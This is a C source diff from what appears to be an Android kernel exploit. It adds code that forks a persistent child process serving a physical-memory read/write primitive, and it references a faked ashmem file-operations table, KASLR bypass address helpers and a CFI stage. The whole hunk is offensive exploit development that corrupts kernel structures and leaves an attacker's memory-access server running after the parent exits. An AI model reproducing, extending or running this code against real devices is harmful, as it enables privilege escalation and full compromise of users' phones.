@@ -922,6 +922,21 @@ int try_cfi_stage(void) {
    * process dies, the page is reused, and any app reopens
    * /dev/ashmem — observed twice on device (E64). */
   if (physrw_read64_ok != 0 && physrw_write64_ok != 0) {
+    /* E145: fork the pipe-based PWRS server BEFORE the gadget seam.
+     * The server serves via g_physrw_fd (pipe primitive) only — it does
+     * not need the ashmem gadget, which the parent defuses below. The
+     * forked child survives the parent's exit (no PDEATHSIG on fork). */
+    {
+      pid_t pwrs_pid = fork();
+      if (pwrs_pid == 0) {
+        physrw_server_launch(g_physrw_fd, (uintptr_t)fake_fops,
+                             kaslr_done ? canon_addr(ASHMEM_FOPS)
+                                        : p0_data_alias(ASHMEM_FOPS));
+        _exit(0);
+      }
+      pr_info("pwrs server forked pid=%d fd=%d\n", (int)pwrs_pid,
+              g_physrw_fd);
+    }
     uint64_t original_fops_seam =
       kaslr_done ? canon_addr(ASHMEM_FOPS) : p0_data_alias(ASHMEM_FOPS);
     ssize_t restore_seam = configfs_write_once(
